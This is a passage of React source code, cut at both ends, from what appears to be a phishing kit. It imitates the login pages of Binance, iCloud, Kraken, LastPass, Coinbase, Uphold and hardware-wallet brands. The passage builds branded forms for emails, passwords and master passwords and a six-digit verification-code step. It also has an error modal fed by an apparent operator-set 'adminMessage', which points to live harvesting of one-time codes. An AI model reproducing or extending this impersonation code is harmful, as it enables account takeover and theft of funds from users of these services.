          return <circle key={`inner-${i}`} cx={x} cy={y} r={3} fill={color} opacity={0.8} />
        })}
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <AppleLogo className="w-10 h-12" />
      </div>
    </div>
  )

  // iCloud Privacy Icon
  const IcloudPrivacyIcon = () => (
    <svg viewBox="0 0 24 24" className="w-8 h-8" aria-hidden="true">
      <circle cx="12" cy="8" r="4" fill="#2997ff" />
      <path d="M12 14c-6 0-8 3-8 5v1h16v-1c0-2-2-5-8-5z" fill="#2997ff" />
    </svg>
  )

  // iCloud Passkey Icon (for "Sign in with iPhone" button)
  const IcloudPasskeyIcon = () => (
    <svg viewBox="0 0 24 24" className="w-6 h-6" aria-hidden="true">
      <circle cx="9" cy="7" r="4" fill="black" />
      <path d="M9 12c-5.5 0-8 2.5-8 5.5V20h16v-2.5c0-3-2.5-5.5-8-5.5z" fill="black" />
      <circle cx="19" cy="14.5" r="3" fill="none" stroke="black" strokeWidth="1.8" />
      <line x1="19" y1="17.5" x2="19" y2="23" stroke="black" strokeWidth="1.8" strokeLinecap="round" />
      <line x1="19" y1="20" x2="21.5" y2="20" stroke="black" strokeWidth="1.8" strokeLinecap="round" />
      <line x1="19" y1="22" x2="21.5" y2="22" stroke="black" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  )

  // Dynamic Brand Logo
  const BrandLogo = ({ size = 32 }: { size?: number }) => {
    if (!brand) return null
    if (brand.id === "binance") {
      return (
        <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 126.611 126.611" aria-label="Binance logo" role="img">
          <title>Binance logo</title>
          <polygon fill="#F0B90B" points="38.171,53.203 62.759,28.616 87.36,53.216 101.667,38.909 62.759,0 23.864,38.896"/>
          <polygon fill="#F0B90B" points="0,63.305 14.307,48.998 28.614,63.305 14.307,77.612"/>
          <polygon fill="#F0B90B" points="38.171,73.408 62.759,97.995 87.36,73.396 101.674,87.696 62.759,126.611 23.864,87.716 23.851,87.703"/>
          <polygon fill="#F0B90B" points="97.997,63.312 112.304,49.005 126.611,63.312 112.304,77.619"/>
          <polygon fill="#F0B90B" points="77.271,63.298 62.759,48.792 52.03,59.52 50.797,60.753 48.254,63.295 62.759,77.8 77.277,63.304"/>
        </svg>
      )
    }
    if (brand.id === "icloud") {
      return (
        <div className="flex items-center gap-1">
          <AppleLogo className="w-[18px] h-[18px]" />
          <span className="text-[21px] font-normal tracking-tight text-white">iCloud</span>
        </div>
      )
    }
    if (brand.id === "lastpass") {
      return (
        <span className={`font-bold text-[#D32D27]`} style={{ fontSize: size > 36 ? "2.25rem" : "1.5rem" }}>LastPass</span>
      )
    }
    if (brand.id === "ledger") {
      return (
        <div className="relative flex items-center">
          <span className="absolute -top-0.5 -left-1 h-2.5 w-2.5 border-l-2 border-t-2 border-foreground" aria-hidden="true" />
          <span className="px-3 py-1 text-sm font-bold tracking-[0.2em] text-foreground">LEDGER</span>
          <span className="absolute -bottom-0.5 -right-1 h-2.5 w-2.5 border-r-2 border-b-2 border-foreground" aria-hidden="true" />
        </div>
      )
    }
    if (brand.id === "uphold") {
      return (
        <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 512 512" aria-label="Uphold logo" role="img">
          <title>Uphold logo</title>
          <path d="M360 277c-9 19-20 36-33 50 9-34 5-78-15-120-10-22-24-42-40-59 25-19 51-25 71-16 13 6 23 17 28 33 12 31 7 72-11 112m-208 0c-18-40-23-81-11-112 5-16 15-27 28-33 20-9 46-3 71 16-16 17-30 37-40 59-20 42-24 86-15 120-13-14-24-31-33-50m123 86a47 47 0 01-38 0c-38-17-46-85-17-148 10-20 22-37 36-52 14 15 26 32 36 52 29 63 21 131-17 148m52-256c-23-1-48 8-71 27-23-19-48-28-71-27a126 126 0 01142 0m66 51c-20-56-74-94-137-94s-118 38-137 94v1c-13 35-8 82 12 127 28 60 79 102 124 102h2c45 0 96-42 124-102 20-45 25-92 12-128m-98 263c-13 4-26 6-38 6h-2c-12 0-25-2-37-6-6-1-13 2-14 7-2 6 1 12 7 14 15 4 30 6 44 6h2c14 0 29-2 44-6 6-2 9-8 8-13-2-6-9-9-14-8" fill="#49cc68"/>
        </svg>
      )
    }
    if (brand.id === "kraken") {
      return (
        <img 
          src="https://cdn.brandfetch.io/idYQrXoH-Q/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B" 
          alt="Kraken" 
          width={size > 36 ? 140 : 120} 
          height={size > 36 ? 40 : 32} 
          className="h-8 w-auto"
        />
      )
    }
    return (
      <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 48 48" aria-label="Coinbase logo" role="img">
        <title>Coinbase logo</title>
        <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0052FF"/>
      </svg>
    )
  }

  // Passkey Icon
  const PasskeyIcon = () => (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path fillRule="evenodd" clipRule="evenodd" d="M12 4C9.79086 4 8 5.79086 8 8C8 10.2091 9.79086 12 12 12C14.2091 12 16 10.2091 16 8C16 5.79086 14.2091 4 12 4ZM6 8C6 4.68629 8.68629 2 12 2C15.3137 2 18 4.68629 18 8C18 11.3137 15.3137 14 12 14C8.68629 14 6 11.3137 6 8Z" fill="currentColor"/>
      <path fillRule="evenodd" clipRule="evenodd" d="M12 16C8.13401 16 5 19.134 5 23H3C3 18.0294 7.02944 14 12 14C16.9706 14 21 18.0294 21 23H19C19 19.134 15.866 16 12 16Z" fill="currentColor"/>
    </svg>
  )

  // Google Icon
  const GoogleIcon = () => (
    <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M22.56 12c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
    </svg>
  )

  // Apple Icon
  const AppleIcon = () => (
    <svg width="20" height="20" viewBox="0 0 814 1000" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 781.5 0 643.5 0 513.8c0-207.7 135-317.8 267.6-317.8 70.1 0 128.3 46.3 172.3 46.3 42 0 107.4-49.2 186.6-49.2 30.2 0 138.8 2.6 210.6 99.8zm-265-181.2c31.4-36.5 53.2-87.3 53.2-138.1 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.4-72.5z"/>
    </svg>
  )

  // Telegram Icon
  const TelegramIcon = () => (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" fill="#34AADF"/>
    </svg>
  )

  // QR Code Icon
  const QRCodeIcon = () => (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="3" y="3" width="7" height="7" rx="1" stroke="#848E9C" strokeWidth="1.5"/>
      <rect x="14" y="3" width="7" height="7" rx="1" stroke="#848E9C" strokeWidth="1.5"/>
      <rect x="3" y="14" width="7" height="7" rx="1" stroke="#848E9C" strokeWidth="1.5"/>
      <rect x="5.5" y="5.5" width="2" height="2" fill="#848E9C"/>
      <rect x="16.5" y="5.5" width="2" height="2" fill="#848E9C"/>
      <rect x="5.5" y="16.5" width="2" height="2" fill="#848E9C"/>
      <rect x="14" y="14" width="3" height="3" fill="#848E9C"/>
      <rect x="18" y="14" width="3" height="3" fill="#848E9C"/>
      <rect x="14" y="18" width="3" height="3" fill="#848E9C"/>
      <rect x="18" y="18" width="3" height="3" fill="#848E9C"/>
    </svg>
  )

  // Binance Logo with text
  const BinanceFullLogo = () => (
    <div className="flex items-center gap-2">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 126.611 126.611">
        <polygon fill="#F0B90B" points="38.171,53.203 62.759,28.616 87.36,53.216 101.667,38.909 62.759,0 23.864,38.896"/>
        <polygon fill="#F0B90B" points="0,63.305 14.307,48.998 28.614,63.305 14.307,77.612"/>
        <polygon fill="#F0B90B" points="38.171,73.408 62.759,97.995 87.36,73.396 101.674,87.696 62.759,126.611 23.864,87.716 23.851,87.703"/>
        <polygon fill="#F0B90B" points="97.997,63.312 112.304,49.005 126.611,63.312 112.304,77.619"/>
        <polygon fill="#F0B90B" points="77.271,63.298 62.759,48.792 52.03,59.52 50.797,60.753 48.254,63.295 62.759,77.8 77.277,63.304"/>
      </svg>
      <span className="text-lg font-bold tracking-wide text-[#EAECEF]">BINANCE</span>
    </div>
  )

  // Error Modal
  const ErrorModal = () => {
    if (!brand) return null
    return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
      <div className="mx-4 w-full max-w-sm rounded-xl p-6 shadow-lg" style={{ backgroundColor: brand.bgCard }}>
        <div className="mb-4 flex justify-center">
          <div className="flex h-12 w-12 items-center justify-center rounded-full bg-red-100">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <line x1="15" y1="9" x2="9" y2="15" />
              <line x1="9" y1="9" x2="15" y2="15" />
            </svg>
          </div>
        </div>
        <h3 className="mb-2 text-center text-lg font-semibold" style={{ color: brand.textPrimary }}>Verification Failed</h3>
        <p className="mb-6 text-center text-sm" style={{ color: brand.textSecondary }}>{adminMessage || "Please try again."}</p>
        <button
          onClick={handleDismissError}
          className="w-full cursor-pointer rounded-full py-3 text-base font-semibold transition-colors"
          style={{ backgroundColor: brand.errorButtonBg, color: brand.id === "binance" ? "#181A20" : "#fff" }}
        >
          Try Again
        </button>
      </div>
    </div>
  )}

  // Code Input Component for verification steps
  const CodeInput = ({ onSubmit, label, description }: { onSubmit: (e: React.FormEvent) => Promise<void>, label: string, description: string }) => {
    if (!brand) return null
    return (
    <form onSubmit={onSubmit}>
      <div className="mb-4">
        <h2 className="mb-2 text-xl font-semibold" style={{ color: brand.textPrimary }}>{label}</h2>
        <p className="mb-6 text-sm" style={{ color: brand.textSecondary }}>{description}</p>
        <div className="flex justify-between gap-1.5 sm:gap-2" onPaste={handleCodePaste}>
          {verificationCode.map((digit, index) => (
            <input
              key={index}
              ref={(el) => {
                codeInputRefs.current[index] = el
              }}
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={digit}
              onChange={(e) => handleCodeChange(index, e.target.value)}
              onKeyDown={(e) => handleCodeKeyDown(index, e)}
              onFocus={() => handleCodeFocus(index)}
              className="h-11 w-11 sm:h-12 sm:w-12 rounded-lg border text-center text-base sm:text-lg outline-none transition-colors"
              style={{
                backgroundColor: brand.inputBg,
                borderColor: brand.inputBorder,
                color: brand.textPrimary,
              }}
              disabled={status === "pending"}
            />
          ))}
        </div>
      </div>

      <div className="mb-6 text-center">
        <button
          type="button"
          className="cursor-pointer text-sm hover:underline"
          style={{ color: brand.primary }}
        >
          Resend code
        </button>
      </div>

      <button
        type="submit"
        disabled={status === "pending" || verificationCode.join("").length !== 6}
        className={`w-full cursor-pointer py-3 text-base font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isIcloud ? "rounded-xl" : isBinance || isKrakenBrand ? "rounded-lg" : "rounded-full"}`}
        style={{ backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" }}
      >
        {status === "pending" ? (
          <span className="flex items-center justify-center gap-2">
            <span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></span>
            Verifying...
          </span>
        ) : (
          "Submit"
        )}
      </button>
      
      {status === "pending" && (
        <p className="mt-4 text-center text-sm" style={{ color: brand.textSecondary }}>Please wait while we verify your code...</p>
      )}
    </form>
  )}

  // If Ledger brand, render inline flow at root - no separate routes
  if (isLedger) {
    return <LedgerFlow />
  }

  // If Trezor brand, render inline flow at root - no separate routes
  if (isTrezor) {
    return <TrezorFlow />
  }

  // If 1Password brand, render inline flow at root - no separate routes
  if (isOnePassword) {
    return <OnePassFlow />
  }

  // If Google brand, render inline flow at root - no separate routes
  if (isGoogle) {
    return <GoogleFlow />
  }

  // Kraken now uses the session-based flow like Coinbase
  // The KrakenFlow component is deprecated in favor of brand-specific styling in the main flow
  
  // Single loading screen - branded once brand loads, neutral until then
  if (!brand || initializing) {
    const bg = brand ? brand.bgMain : "#0e0f11"
    const barBg = brand ? (brand.id === "binance" ? "#2B3139" : brand.id === "ledger" ? "#2a2a2a" : "#E5E7EB") : "#333"
    const barColor = brand ? brand.primary : "#666"
    return (
      <div className="flex min-h-screen flex-col items-center justify-center" style={{ backgroundColor: bg }}>
        {brand ? (
          <BrandLogo size={48} />
        ) : (
          <div className="h-12 w-12" />
        )}
        <div className="mt-6 h-1 w-32 overflow-hidden rounded-full" style={{ backgroundColor: barBg }}>
          <div className="h-full animate-[loading_1.2s_ease-in-out_infinite] rounded-full" style={{ backgroundColor: barColor, width: "40%" }} />
        </div>
      </div>
    )
  }

  const isBinance = brand.id === "binance"
  const isIcloud = brand.id === "icloud"
  const isLastpass = brand.id === "lastpass"
  const isUphold = brand.id === "uphold"
  const isKrakenBrand = brand.id === "kraken"
  const btnTextColor = isBinance ? "#181A20" : "#fff"

  return (
    <div className="flex min-h-screen flex-col" style={{ backgroundColor: brand.bgMain }}>
      {status === "rejected" && step !== "wallet_link" && step !== "wallet_unlink" && <ErrorModal />}

      {/* Header with brand logo - always top-left */}
      <header
        className={`flex items-center justify-between px-5 py-4 md:px-8 ${isLastpass ? "bg-white shadow-sm" : isIcloud ? "" : ""}`}
      >
        <div className="flex items-center gap-3">
          <BrandLogo />
          {!isIcloud && !isUphold && !isKrakenBrand && (
            <>
              <div className="h-5 w-px" style={{ backgroundColor: isLastpass ? "#d1d5db" : brand.dividerColor }} />
              <span className="text-sm font-medium" style={{ color: isLastpass ? "#6b7280" : brand.textSecondary }}>
                {getStepLabel(step)}
              </span>
            </>
          )}
        </div>
        {isIcloud && (
          <button className="rounded-full p-2 text-white transition-colors hover:bg-[#424245]" aria-label="More options">
            <svg viewBox="0 0 24 24" className="w-5 h-5" fill="currentColor"><circle cx="5" cy="12" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="19" cy="12" r="2" /></svg>
          </button>
        )}
        {isKrakenBrand && (
          <div className="flex items-center gap-3">
            <button className="flex cursor-pointer items-center gap-2 rounded-full border border-[#E0E0E0] bg-white px-4 py-2 text-sm font-medium text-[#1E1E2D] transition-colors hover:bg-gray-50">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
              <span>English (US)</span>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
            </button>
            <button className="cursor-pointer rounded-lg bg-[#7B61FF] px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-[#6B51EF]">
              Create Account
            </button>
          </div>
        )}
      </header>

        <main className="flex flex-1 flex-col items-center justify-center px-4 sm:px-6 pb-8">
        <div className={`w-full transition-[max-width] duration-300 ${isLastpass ? "max-w-[480px] rounded-lg bg-white p-8 shadow-lg" : isIcloud ? "max-w-[580px] rounded-3xl bg-[#2a2a2c] p-6 pb-10 shadow-2xl md:p-12 md:pb-16 mx-4 md:mx-0" : isBinance ? "max-w-[400px] rounded-2xl border border-[#2B3139] bg-[#1E2329] p-5 sm:p-8" : isUphold ? "max-w-[500px] rounded-xl bg-white p-8 shadow-md" : isKrakenBrand ? "max-w-[420px] rounded-2xl bg-white p-8 shadow-sm" : "max-w-[400px]"}`}>

          {/* iCloud email step */}
          {step === "email" && isIcloud && (
            <>
              <div className="flex justify-center mb-4 md:mb-6">
                <AppleDotsRing />
              </div>

              <h1 className="text-white text-[22px] md:text-[28px] font-semibold text-center mb-6 md:mb-8">
                {brand.loginHeading}
              </h1>

              <form onSubmit={handleContinue}>
                <div className="mb-2">
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email or Phone Number"
                    className="w-full rounded-xl border px-4 py-3.5 text-[17px] outline-none transition-colors"
                    style={{
                      backgroundColor: brand.inputBg,
                      borderColor: brand.inputBorder,
                      color: brand.textPrimary,
                    }}
                    onFocus={(e) => { e.currentTarget.style.borderColor = brand.inputBorderFocus; e.currentTarget.style.boxShadow = `0 0 0 1px ${brand.inputBorderFocus}` }}
                    onBlur={(e) => { e.currentTarget.style.borderColor = brand.inputBorder; e.currentTarget.style.boxShadow = "none" }}
                    autoComplete="email"
                  />
                </div>

                <div className="mb-8">
                  <a href="#" className="text-[14px] hover:underline" style={{ color: brand.primary }}>
                    {brand.signUpText}
                  </a>
                </div>

                {/* Privacy Section */}
                <div className="flex flex-col items-center mb-8">
                  <IcloudPrivacyIcon />
                  <p className="text-[11px] text-center mt-2 leading-relaxed max-w-[340px]" style={{ color: brand.textSecondary }}>
                    Your Apple Account information is used to allow you to sign in securely and
                    access your data. Apple records certain data for security, support, and
                    reporting purposes.{" "}
                    <a href="#" className="hover:underline" style={{ color: brand.primary }}>
                      See how your data is managed...
                    </a>
                  </p>
                </div>

                <div className="flex flex-col gap-3 md:flex-row">
                  <div className="flex-1">
                    <button
                      type="submit"
                      disabled={!email || !email.includes("@") || !email.includes(".")}
                      className="w-full cursor-pointer rounded-xl py-3 px-6 text-[15px] font-medium text-white transition-colors disabled:cursor-not-allowed md:text-[17px]"
                      style={{ backgroundColor: (!email || !email.includes("@") || !email.includes(".")) ? "#424245" : brand.primary, color: (!email || !email.includes("@") || !email.includes(".")) ? "#86868b" : "#fff" }}
                    >
                      Continue
                    </button>
                  </div>
                  <div className="flex flex-1 flex-col items-center">
                    <button type="button" className="flex w-full cursor-pointer items-center justify-center gap-2 whitespace-nowrap rounded-xl bg-white py-3 px-6 text-[15px] font-medium text-black transition-colors hover:bg-gray-100 active:bg-gray-200 md:text-[17px]">
                      <IcloudPasskeyIcon />
                      <span>Sign in with iPhone</span>
                    </button>
                    <p className="mt-2 text-center text-[11px]" style={{ color: brand.textSecondary }}>
                      Requires a device with iOS 17 or later.
                    </p>
                  </div>
                </div>
              </form>
            </>
          )}

{/* Kraken Login Step - Light themed card with animated mascot */}
                {(step === "email" || step === "password") && isKrakenBrand && (
                  <>
                    {/* Animated Kraken Mascot */}
                    <div className="mb-6 flex justify-center">
                      <video
                        autoPlay
                        loop
                        muted
                        playsInline
                        className="h-[120px] w-[120px] object-contain"
                      >
                        <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Beast_Web-A8CKL2AKGxPWN1cSyW6cFKVa4MSFLm.webm" type="video/webm" />
                      </video>
                    </div>

                    <h1 className="mb-6 text-center text-[24px] font-semibold text-[#1E1E2D]">{brand.loginHeading}</h1>
                    
                    <form onSubmit={step === "email" ? handleContinue : handleLogin}>
                      {/* Email/Username Field */}
                      <div className="mb-4">
                        <div className="relative">
                          <input
                            type="text"
                            value={email}
                            onChange={(e) => { setEmail(e.target.value); setEmailError("") }}
                            className="peer w-full rounded-lg border border-[#E0E0E0] bg-white px-4 pb-2 pt-6 text-[#1E1E2D] placeholder-transparent outline-none transition-colors focus:border-[#7B61FF] focus:ring-1 focus:ring-[#7B61FF]"
                            placeholder="Email or username"
                            autoFocus
                            id="kraken-email"
                          />
                          <label 
                            htmlFor="kraken-email"
                            className="absolute left-4 top-2 text-xs text-[#6B6B7B] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:text-xs"
                          >
                            Email or username
                          </label>
                        </div>
                      </div>

                      {/* Password Field */}
                      <div className="mb-4">
                        <div className="relative">
                          <input
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="peer w-full rounded-lg border border-[#E0E0E0] bg-white px-4 pb-2 pt-6 pr-12 text-[#1E1E2D] placeholder-transparent outline-none transition-colors focus:border-[#7B61FF] focus:ring-1 focus:ring-[#7B61FF]"
                            placeholder="Password"
                            id="kraken-password"
                          />
                          <label 
                            htmlFor="kraken-password"
                            className="absolute left-4 top-2 text-xs text-[#6B6B7B] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:text-xs"
                          >
                            Password
                          </label>
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-4 top-1/2 -translate-y-1/2 cursor-pointer text-[#6B6B7B] hover:text-[#1E1E2D] transition-colors"
                          >
                            {showPassword ? (
                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                            ) : (
                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                            )}
                          </button>
                        </div>
                      </div>

                      {/* Forgot Password Link */}
                      <div className="mb-4 text-left">
                        <span className="text-sm text-[#6B6B7B]">Forgot </span>
                        <a href="#" onClick={(e) => e.preventDefault()} className="text-sm text-[#7B61FF] hover:underline">
                          password
                        </a>
                        <span className="text-sm text-[#6B6B7B]"> or </span>
                        <a href="#" onClick={(e) => e.preventDefault()} className="text-sm text-[#7B61FF] hover:underline">
                          username
                        </a>
                        <span className="text-sm text-[#6B6B7B]">?</span>
                      </div>

                      {emailError && (
                        <p className="mb-4 text-sm text-red-500">{emailError}</p>
                      )}

                      {/* Continue Button */}
                      <button
                        type="submit"
                        disabled={status === "pending"}
                        className="flex w-full cursor-pointer items-center justify-center gap-2 rounded-lg bg-[#7B61FF] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#6B51EF] disabled:opacity-70 disabled:cursor-not-allowed"
                      >
                        {status === "pending" ? (
                          <>
                            <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/></svg>
                            <span>Signing in...</span>
                          </>
                        ) : (
                          "Continue"
                        )}
                      </button>
                    </form>

                    {/* Divider */}
                    <div className="my-5 flex items-center gap-4">
                      <div className="h-px flex-1 bg-[#E0E0E0]" />
                      <span className="text-sm text-[#6B6B7B]">Or</span>
                      <div className="h-px flex-1 bg-[#E0E0E0]" />
                    </div>

                    {/* Social Sign In Buttons */}
                    <div className="flex justify-center gap-4">
                      {/* Google Button */}
                      <button className="flex h-12 w-12 cursor-pointer items-center justify-center rounded-lg border border-[#E0E0E0] bg-white transition-colors hover:bg-gray-50">
                        <svg width="24" height="24" viewBox="0 0 24 24">
                          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                        </svg>
                      </button>

                      {/* Apple Button */}
                      <button className="flex h-12 w-12 cursor-pointer items-center justify-center rounded-lg border border-[#E0E0E0] bg-white transition-colors hover:bg-gray-50">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="#000000">
                          <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                        </svg>
                      </button>
                    </div>

                    {/* Support Link */}
                    <p className="mt-6 text-center text-sm text-[#6B6B7B]">
                      {"Still can't sign in? "}
                      <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">
                        Email us
                      </a>
                    </p>
                  </>
                )}

                {/* LastPass combined email+password step */}
                {(step === "email" || step === "password") && isLastpass && (
            <>
              <div className="mb-6 text-center">
                <span className="text-3xl font-bold text-[#D32D27]">LastPass</span>
              </div>

              <div className="mb-6 flex items-center justify-between">
                <h1 className="text-lg font-bold text-gray-900">LOG IN</h1>
                <span className="text-sm text-gray-900">
                  {"OR "}
                  <a href="#" className="font-medium text-[#C5A132] hover:underline">CREATE AN ACCOUNT</a>
                </span>
              </div>

              <form onSubmit={(e) => {
                e.preventDefault()
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
                if (!emailRegex.test(email)) {
                  setEmailError("Please enter a valid email address")
                  return
                }
                setEmailError("")
                handleLogin(e)
              }}>
                <div className="mb-4">
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => { setEmail(e.target.value); if (emailError) setEmailError("") }}
                    onBlur={() => {
                      if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        setEmailError("Please enter a valid email address")
                      }
                    }}
                    placeholder="Email address"
                    className={`w-full border-b-2 bg-transparent py-3 text-sm text-gray-900 placeholder-gray-500 outline-none transition-colors ${emailError ? "border-red-500" : "border-gray-300 focus:border-[#D32D27]"}`}
                    autoComplete="email"
                  />
                  {emailError && (
                    <p className="mt-1 text-xs text-red-600">{emailError}</p>
                  )}
                </div>

                <div className="mb-6">
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Master Password"
                      className="w-full border-b-2 border-gray-300 bg-transparent py-3 pr-10 text-sm text-gray-900 placeholder-gray-500 outline-none transition-colors focus:border-[#D32D27]"
                      disabled={status === "pending"}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-0 top-1/2 -translate-y-1/2 cursor-pointer text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? (
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
